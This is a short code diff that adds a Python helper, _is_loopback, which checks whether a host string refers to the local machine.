+def _is_loopback(host: str) -> bool:
+    return host == "localhost" or host == "::1" or host.startswith("127.")
 
 
 if __name__ == "__main__":
